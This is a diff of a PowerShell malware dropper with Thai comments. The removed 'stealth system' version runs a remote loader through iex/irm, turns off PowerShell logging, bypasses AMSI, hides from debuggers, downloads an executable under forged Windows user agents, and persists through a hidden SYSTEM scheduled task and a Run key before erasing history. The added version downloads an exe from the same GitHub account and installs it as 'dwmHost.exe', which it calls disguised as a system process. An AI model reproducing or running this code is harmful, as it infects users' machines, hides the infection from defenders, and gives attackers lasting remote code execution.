@@ -1,488 +1,94 @@
-# 🚀 ULTIMATE STEALTH SYSTEM - Enhanced Version
-# Fixed: No early termination, Complete stealth, Auto-cleanup
+# Menu Selection
+Write-Host "+ Program Installer & Runner (Disguised Install)"
+Write-Host "1. Install & Run"
+Write-Host "2. Clean"
 
-Write-Host "[=== ULTIMATE STEALTH SYSTEM ===]" -ForegroundColor Cyan
-Write-Host "[1] ติดตั้ง" -ForegroundColor Green
-Write-Host "[2] คลีน" -ForegroundColor Yellow
+$choice = Read-Host "Enter choice (1/2)"
 
-$choice = Read-Host "`nเลือกตัวเลือก"
-
-# Safe elevation with no exit
+# Check for Administrator rights
+# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+# *ต้องใช้สิทธิ์ Admin เพื่อติดตั้งไฟล์ใน C:\ProgramData*
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    try {
-        $scriptContent = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt" -TimeoutSec 5
-        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$scriptContent`"" -Verb RunAs -WindowStyle Hidden
-    } catch {
-        try {
-            Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`"" -Verb RunAs -WindowStyle Hidden
-        } catch {
-            Write-Host "[!] ไม่สามารถขอสิทธิ์ Administrator ได้" -ForegroundColor Red
-        }
-    }
+    Write-Host "Restarting with administrator privileges..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
     exit
 }
 
-# Enhanced Windows API for advanced operations
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
+# Define paths and variables
+# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+# **ตำแหน่งติดตั้งที่ซ่อนตัว: C:\ProgramData\WindowsSystemState**
+$InstallPath = Join-Path $env:ProgramData "WindowsSystemState"
+# **ชื่อไฟล์ปลายทาง: dwmHost.exe (ปลอมตัวเป็น Process ระบบ)**
+$SexeDestination = Join-Path $InstallPath "dwmHost.exe" 
 
-public class StealthAPI {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
-    
-    [DllImport("kernel32.dll")]
-    public static extern bool IsDebuggerPresent();
-    
-    [DllImport("kernel32.dll")]
-    public static extern void OutputDebugString(string lpOutputString);
-    
-    [DllImport("ntdll.dll")]
-    public static extern uint NtSetInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref uint ProcessInformation, uint ProcessInformationLength);
-    
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
-    
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    
-    [DllImport("kernel32.dll")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-}
-"@
+# URL ดาวน์โหลด Raw file จาก GitHub (ของคุณ)
+$SexeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/EEEEEEEEEEEEEEEEE.exe" 
 
-function Invoke-AdvancedStealth {
-    Write-Host "[+] เปิดใช้งานระบบล่องหนขั้นสูง..." -ForegroundColor Yellow
-    
+# Install & Run Mode
+# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+if ($choice -eq "1") {
+    Write-Host "`nStarting installation..."
+
+    # สร้างโฟลเดอร์ติดตั้งถ้ายังไม่มี
+    Write-Host "Checking/Creating installation folder in ProgramData..."
+    if (-not (Test-Path $InstallPath)) {
+        New-Item -Path $InstallPath -Type Directory | Out-Null
+        Write-Host "Created folder: $InstallPath" -ForegroundColor Cyan
+    }
+
+    # Download exe 
+    Write-Host "Downloading and installing executable..."
     try {
-        # Disable all logging and monitoring
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0 -ErrorAction SilentlyContinue
-        
-        # Clear all PowerShell evidence
-        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-        Clear-History -ErrorAction SilentlyContinue
-        
-        # Advanced AMSI bypass
-        try {
-            $amsiContext = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-            $amsiContext.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-        } catch {}
-        
-        # Anti-debugging
-        try {
-            if ([StealthAPI]::IsDebuggerPresent()) {
-                Write-Host "[!] พบดีบักเกอร์ - เปิดใช้งานการป้องกัน" -ForegroundColor Red
-            }
-        } catch {}
-        
-        # Process protection
-        try {
-            $processHandle = [StealthAPI]::GetCurrentProcess()
-            $hideFromDebugger = 0x1
-            [StealthAPI]::NtSetInformationProcess($processHandle, 0x1F, [ref]$hideFromDebugger, 4)
-        } catch {}
-        
-        Write-Host "[✓] ระบบล่องหนทำงานแล้ว" -ForegroundColor Green
-        Write-Host "[✓] การบันทึกถูกปิดแล้ว" -ForegroundColor Green
-        Write-Host "[✓] AMSI ถูกบายพาส" -ForegroundColor Green
-        
+        $tempfile = Join-Path $env:TEMP "temp_download.exe"
+        Invoke-WebRequest -Uri $SexeUrl -OutFile $tempfile
+        # ย้ายไฟล์ที่ดาวน์โหลดมาไปยัง ProgramData โดยใช้ชื่อ dwmHost.exe
+        Move-Item -Path $tempfile -Destination $SexeDestination -Force
+        Write-Host "Executable download completed." -ForegroundColor Green
     } catch {
-        Write-Host "[!] การตั้งค่าระบบล่องหนบางส่วนล้มเหลว" -ForegroundColor Yellow
+        Write-Host "Executable download failed: $." -ForegroundColor Red
+        exit
     }
-}
 
-function Invoke-SmartDownload {
-    Write-Host "[+] เริ่มดาวน์โหลดไฟล์..." -ForegroundColor Yellow
-    
-    $url = "https://github.com/Verte225066/test/raw/refs/heads/main/cmd.exe"
-    $tempFiles = @()
-    
+    # Run the program directly
+    Write-Host "Starting the program..."
     try {
-        # Create unique temp file name
-        $tempFile = Join-Path $env:temp "win_system_$(Get-Date -Format 'yyyyMMdd_HHmmss').exe"
-        Write-Host "[+] ตำแหน่งไฟล์: $tempFile" -ForegroundColor Gray
-        
-        # Download with multiple fallback methods
-        $success = $false
-        $methods = @("Invoke-WebRequest", "WebClient", "BITS")
-        
-        foreach ($method in $methods) {
-            try {
-                Write-Host "[+] พยายามดาวน์โหลดด้วย: $method" -ForegroundColor Gray
-                
-                switch ($method) {
-                    "Invoke-WebRequest" {
-                        Invoke-WebRequest -Uri $url -OutFile $tempFile -UserAgent "Microsoft-CryptoAPI/10.0" -TimeoutSec 10
-                    }
-                    "WebClient" {
-                        $webClient = New-Object System.Net.WebClient
-                        $webClient.Headers.Add("User-Agent", "Windows-Update-Agent/10.0")
-                        $webClient.DownloadFile($url, $tempFile)
-                        $webClient.Dispose()
-                    }
-                    "BITS" {
-                        Start-BitsTransfer -Source $url -Destination $tempFile -ErrorAction Stop
-                    }
-                }
-                
-                if (Test-Path $tempFile) {
-                    $fileSize = (Get-Item $tempFile).Length
-                    if ($fileSize -gt 1024) {
-                        Write-Host "[✓] ดาวน์โหลดสำเร็จ: $fileSize ไบต์" -ForegroundColor Green
-                        $success = $true
-                        $tempFiles += $tempFile
-                        break
-                    } else {
-                        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
-                        Write-Host "[!] ไฟล์มีขนาดเล็กเกินไป: $fileSize ไบต์" -ForegroundColor Yellow
-                    }
-                }
-            } catch {
-                Write-Host "[!] $method ล้มเหลว: $($_.Exception.Message)" -ForegroundColor Yellow
-                continue
-            }
-        }
-        
-        if (-not $success) {
-            throw "วิธีการดาวน์โหลดทั้งหมดล้มเหลว"
-        }
-        
-        return $tempFiles
-        
+        # รันโปรแกรมโดยตรง (ไม่ต้องใช้ -Verb RunAs เพื่อลดปัญหาการรัน)
+        Start-Process -FilePath $SexeDestination
+        Write-Host "Program started successfully." -ForegroundColor Green
     } catch {
-        Write-Host "[!] การดาวน์โหลดล้มเหลว: $($_.Exception.Message)" -ForegroundColor Red
-        # Cleanup on failure
-        foreach ($file in $tempFiles) {
-            try { Remove-Item $file -Force -ErrorAction SilentlyContinue } catch {}
-        }
-        return $null
+        Write-Host "Failed to start program: $." -ForegroundColor Red
     }
-}
+    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
 
-function Start-AdvancedProcess {
-    param([string]$FilePath)
-    
-    Write-Host "[+] เริ่มกระบวนการขั้นสูง..." -ForegroundColor Yellow
-    
+# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Clean Mode
+# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+} elseif ($choice -eq "2") {
+    Write-Host "Cleanup installation..."
+
+    # Stop the process if running (ใช้ชื่อ dwmHost)
+    Write-Host "Stopping dwmHost process..."
     try {
-        # Validate file
-        if (-not (Test-Path $FilePath)) {
-            throw "ไม่พบไฟล์: $FilePath"
-        }
-        
-        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
-        if ($bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) {
-            throw "รูปแบบไฟล์ปฏิบัติการไม่ถูกต้อง"
-        }
-        
-        Write-Host "[✓] ตรวจสอบไฟล์สำเร็จ: $($bytes.Length) ไบต์" -ForegroundColor Green
-        
-        # Start process with advanced options
-        Write-Host "[+] เปิดใช้งานโปรแกรม..." -ForegroundColor Gray
-        
-        # ใช้วิธีการที่เรียบง่ายและน่าเชื่อถือมากขึ้น
-        $process = Start-Process -FilePath $FilePath -PassThru -WindowStyle Normal
-        
-        if (-not $process -or $process.HasExited) {
-            throw "ไม่สามารถเริ่มกระบวนการได้"
-        }
-        
-        Write-Host "[✓] กระบวนการเริ่มทำงาน: PID $($process.Id)" -ForegroundColor Green
-        
-        # Return process info for monitoring
-        return @{
-            Process = $process
-            FilePath = $FilePath
-            StartTime = Get-Date
-        }
-        
+        Stop-Process -Name "dwmHost" -Force -ErrorAction SilentlyContinue
+        Write-Host "Process stopped." -ForegroundColor Green
     } catch {
-        Write-Host "[!] การเริ่มกระบวนการล้มเหลว: $($_.Exception.Message)" -ForegroundColor Red
-        return $null
+        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
     }
+
+    # Remove files and folder
+    if (Test-Path $SexeDestination) {
+        Remove-Item $SexeDestination -Force
+        Write-Host "Removed executable: $SexeDestination" -ForegroundColor Green
+    }
+    
+    # ลบโฟลเดอร์ที่สร้างขึ้นด้วย
+    if (Test-Path $InstallPath) {
+        Remove-Item $InstallPath -Recurse -Force
+        Write-Host "Removed installation folder: $InstallPath" -ForegroundColor Green
+    }
+
+    Write-Host "Cleanup completed." -ForegroundColor Green
+
+} else {
+    Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
 }
-
-function Set-AdvancedPersistence {
-    Write-Host "[+] ตั้งค่าการทำงานต่อเนื่อง..." -ForegroundColor Yellow
-    
-    try {
-        $methods = @()
-        
-        # Scheduled Task with advanced options
-        try {
-            $taskName = "Microsoft\Windows\SystemDataUpdater"
-            Write-Host "[+] สร้างงานตามกำหนดการ: $taskName" -ForegroundColor Gray
-            
-            $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`""
-            $taskTrigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay "00:03:00"
-            $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-            $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew
-            
-            Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Description "อัปเดตข้อมูลระบบ Windows" -Force | Out-Null
-            $methods += "งานตามกำหนดการ"
-            Write-Host "[✓] สร้างงานตามกำหนดการสำเร็จ" -ForegroundColor Green
-        } catch {
-            Write-Host "[!] การสร้างงานตามกำหนดการล้มเหลว: $($_.Exception.Message)" -ForegroundColor Yellow
-        }
-        
-        # Registry persistence
-        try {
-            $regName = "WindowsSystemUpdate"
-            Write-Host "[+] ตั้งค่าการทำงานในรีจิสตรี: $regName" -ForegroundColor Gray
-            
-            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $regName -Value "powershell.exe -WindowStyle Hidden -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`"" -ErrorAction SilentlyContinue
-            $methods += "รีจิสตรี"
-            Write-Host "[✓] ตั้งค่ารีจิสตรีสำเร็จ" -ForegroundColor Green
-        } catch {
-            Write-Host "[!] การตั้งค่ารีจิสตรีล้มเหลว: $($_.Exception.Message)" -ForegroundColor Yellow
-        }
-        
-        Write-Host "[✓] วิธีการทำงานต่อเนื่อง: $($methods -join ', ')" -ForegroundColor Green
-        return $true
-        
-    } catch {
-        Write-Host "[!] การตั้งค่าการทำงานต่อเนื่องล้มเหลว: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
-    }
-}
-
-function Invoke-CompleteCleanup {
-    Write-Host "[=== โหมดทำความสะอาด ===]" -ForegroundColor Yellow
-    Write-Host "[!] เริ่มกระบวนการทำความสะอาดทั้งหมด..." -ForegroundColor Cyan
-    
-    $cleanupStats = @{
-        Processes = 0
-        Tasks = 0
-        Registry = 0
-        Files = 0
-        Logs = 0
-    }
-    
-    # Phase 1: Process cleanup
-    Write-Host "`n[ขั้นตอน 1] ทำความสะอาดกระบวนการ" -ForegroundColor Green
-    
-    $targetProcesses = @("cmd", "explorerr", "runtime", "win_system", "system_update")
-    foreach ($procName in $targetProcesses) {
-        try {
-            $processes = Get-Process -Name $procName -ErrorAction SilentlyContinue
-            foreach ($process in $processes) {
-                Write-Host "[+] ปิดกระบวนการ: $($process.ProcessName) (PID: $($process.Id))" -ForegroundColor Gray
-                
-                try {
-                    # Try graceful termination first
-                    if ($process.Responding) {
-                        $process.CloseMainWindow() | Out-Null
-                        Start-Sleep -Milliseconds 500
-                    }
-                    
-                    if (!$process.HasExited) {
-                        $process.Kill()
-                        Start-Sleep -Milliseconds 200
-                    }
-                    
-                    if ($process.HasExited) {
-                        $cleanupStats.Processes++
-                        Write-Host "[✓] ปิดกระบวนการแล้ว: $($process.ProcessName)" -ForegroundColor Green
-                    } else {
-                        Write-Host "[!] ไม่สามารถปิดกระบวนการ: $($process.ProcessName)" -ForegroundColor Yellow
-                    }
-                } catch {
-                    Write-Host "[!] ข้อผิดพลาดในการปิดกระบวนการ: $($process.ProcessName)" -ForegroundColor Red
-                }
-            }
-        } catch {
-            Write-Host "[!] ข้อผิดพลาดในการประมวลผล: $procName" -ForegroundColor Red
-        }
-    }
-    
-    # Phase 2: Persistence cleanup
-    Write-Host "`n[ขั้นตอน 2] ลบการทำงานต่อเนื่อง" -ForegroundColor Green
-    
-    # Remove scheduled tasks
-    $taskNames = @(
-        "Microsoft\Windows\SystemDataUpdater",
-        "Microsoft\Windows\DiskFootprint\Diagnosis",
-        "Microsoft\Windows\MemoryDiagnostic\Schedule"
-    )
-    
-    foreach ($taskName in $taskNames) {
-        try {
-            if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
-                Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-                $cleanupStats.Tasks++
-                Write-Host "[✓] ลบงานตามกำหนดการ: $taskName" -ForegroundColor Green
-            }
-        } catch {
-            Write-Host "[!] ไม่สามารถลบงานตามกำหนดการ: $taskName" -ForegroundColor Yellow
-        }
-    }
-    
-    # Remove registry entries
-    $regEntries = @(
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="WindowsSystemUpdate"},
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="SecurityHealth"},
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="Windows Defender"}
-    )
-    
-    foreach ($regEntry in $regEntries) {
-        try {
-            Remove-ItemProperty -Path $regEntry.Path -Name $regEntry.Name -ErrorAction SilentlyContinue
-            $cleanupStats.Registry++
-            Write-Host "[✓] ลบรีจิสตรี: $($regEntry.Name)" -ForegroundColor Green
-        } catch {}
-    }
-    
-    # Phase 3: File cleanup
-    Write-Host "`n[ขั้นตอน 3] ทำความสะอาดไฟล์" -ForegroundColor Green
-    
-    $cleanLocations = @(
-        $env:temp,
-        "$env:windir\Temp",
-        "$env:programdata",
-        "$env:appdata"
-    )
-    
-    $filePatterns = @("*win_system_*", "*system_update_*", "*runtime*", "*.tmp", "*.log")
-    
-    foreach ($location in $cleanLocations) {
-        try {
-            if (Test-Path $location) {
-                foreach ($pattern in $filePatterns) {
-                    Get-ChildItem -Path $location -Filter $pattern -ErrorAction SilentlyContinue | ForEach-Object {
-                        try {
-                            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
-                            $cleanupStats.Files++
-                            Write-Host "[✓] ลบไฟล์: $($_.Name)" -ForegroundColor Green
-                        } catch {
-                            Write-Host "[!] ไม่สามารถลบไฟล์: $($_.Name)" -ForegroundColor Yellow
-                        }
-                    }
-                }
-            }
-        } catch {
-            Write-Host "[!] ข้อผิดพลาดในการทำความสะอาดตำแหน่ง: $location" -ForegroundColor Red
-        }
-    }
-    
-    # Phase 4: Evidence cleanup
-    Write-Host "`n[ขั้นตอน 4] ลบหลักฐาน" -ForegroundColor Green
-    
-    # Clear PowerShell evidence
-    try {
-        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-        Clear-History -ErrorAction SilentlyContinue
-        $cleanupStats.Logs++
-        Write-Host "[✓] ลบประวัติ PowerShell" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] ไม่สามารถลบประวัติ PowerShell" -ForegroundColor Yellow
-    }
-    
-    # Clear recent files
-    try {
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
-        $cleanupStats.Logs++
-        Write-Host "[✓] ลบไฟล์ล่าสุด" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] ไม่สามารถลบไฟล์ล่าสุด" -ForegroundColor Yellow
-    }
-    
-    # Summary
-    Write-Host "`n[=== การทำความสะอาดเสร็จสิ้น ===]" -ForegroundColor Green
-    Write-Host "[✓] กระบวนการที่ปิด: $($cleanupStats.Processes)" -ForegroundColor Green
-    Write-Host "[✓] งานตามกำหนดการที่ลบ: $($cleanupStats.Tasks)" -ForegroundColor Green
-    Write-Host "[✓] รีจิสตรีที่ลบ: $($cleanupStats.Registry)" -ForegroundColor Green
-    Write-Host "[✓] ไฟล์ที่ลบ: $($cleanupStats.Files)" -ForegroundColor Green
-    Write-Host "[✓] หลักฐานที่ลบ: $($cleanupStats.Logs)" -ForegroundColor Green
-    Write-Host "[✓] ระบบกลับสู่สถานะสะอาด" -ForegroundColor Green
-}
-
-# Main execution
-try {
-    Write-Host "[+] เริ่มการทำงาน..." -ForegroundColor Green
-    Invoke-AdvancedStealth
-
-    switch ($choice) {
-        "1" {
-            Write-Host "`n[=== โหมดติดตั้ง ===]" -ForegroundColor Cyan
-            
-            # Step 1: Download
-            Write-Host "`n[ขั้นตอน 1] ดาวน์โหลด" -ForegroundColor Yellow
-            $downloadedFiles = Invoke-SmartDownload
-            
-            if (-not $downloadedFiles -or $downloadedFiles.Count -eq 0) {
-                Write-Host "[!] ไม่สามารถดำเนินการต่อได้โดยไม่มีไฟล์ปฏิบัติการ" -ForegroundColor Red
-                break
-            }
-            
-            $downloadedFile = $downloadedFiles[0]
-            
-            # Step 2: Execute
-            Write-Host "`n[ขั้นตอน 2] การทำงาน" -ForegroundColor Yellow
-            $processInfo = Start-AdvancedProcess -FilePath $downloadedFile
-            
-            if ($processInfo) {
-                Write-Host "[✓] เปิดใช้งานโปรแกรมสำเร็จ" -ForegroundColor Green
-                
-                # Step 3: Set persistence
-                Write-Host "`n[ขั้นตอน 3] ตั้งค่าการทำงานต่อเนื่อง" -ForegroundColor Yellow
-                Set-AdvancedPersistence | Out-Null
-                
-                # Step 4: Monitor and cleanup
-                Write-Host "`n[ขั้นตอน 4] การตรวจสอบและทำความสะอาด" -ForegroundColor Yellow
-                Write-Host "[+] โปรแกรมกำลังทำงาน..." -ForegroundColor Gray
-                
-                # Wait and cleanup files
-                Start-Sleep -Seconds 5
-                try {
-                    Remove-Item $downloadedFile -Force -ErrorAction SilentlyContinue
-                    Write-Host "[✓] ลบไฟล์ชั่วคราว: $(Split-Path $downloadedFile -Leaf)" -ForegroundColor Green
-                } catch {
-                    Write-Host "[!] ไม่สามารถลบไฟล์ชั่วคราว: $(Split-Path $downloadedFile -Leaf)" -ForegroundColor Yellow
-                }
-                
-                Write-Host "`n[=== การติดตั้งเสร็จสิ้น ===]" -ForegroundColor Green
-                Write-Host "[✓] โปรแกรมทำงานพร้อม UI" -ForegroundColor Green
-                Write-Host "[✓] ตั้งค่าการทำงานต่อเนื่องแล้ว" -ForegroundColor Green
-                Write-Host "[✓] ลบไฟล์ชั่วคราวแล้ว" -ForegroundColor Green
-                Write-Host "[✓] ระบบล่องหนทำงานแล้ว" -ForegroundColor Green
-            } else {
-                Write-Host "[!] การทำงานล้มเหลว" -ForegroundColor Red
-            }
-        }
-        
-        "2" {
-            Write-Host "`n[=== โหมดคลีน ===]" -ForegroundColor Cyan
-            Invoke-CompleteCleanup
-        }
-        
-        default {
-            Write-Host "[!] ตัวเลือกไม่ถูกต้อง" -ForegroundColor Red
-        }
-    }
-    
-} catch {
-    Write-Host "[!] ข้อผิดพลาดร้ายแรง: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "[!] ที่: $($_.InvocationInfo.ScriptName):$($_.InvocationInfo.ScriptLineNumber)" -ForegroundColor Red
-}
-
-# Keep PowerShell open and clean up
-Write-Host "`n[+] การทำงานสคริปต์เสร็จสิ้น" -ForegroundColor Green
-Write-Host "[+] PowerShell จะยังคงเปิดอยู่" -ForegroundColor Gray
-
-# Final cleanup
-try {
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-    Clear-History -ErrorAction SilentlyContinue
-} catch {}
-
-Write-Host "[+] กดปุ่มใดๆ เพื่อปิด..." -ForegroundColor Gray
-
-try {
-    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-} catch {
-    Start-Sleep -Seconds 5
-}
-
-Write-Host "[+] กำลังปิด..." -ForegroundColor Yellow
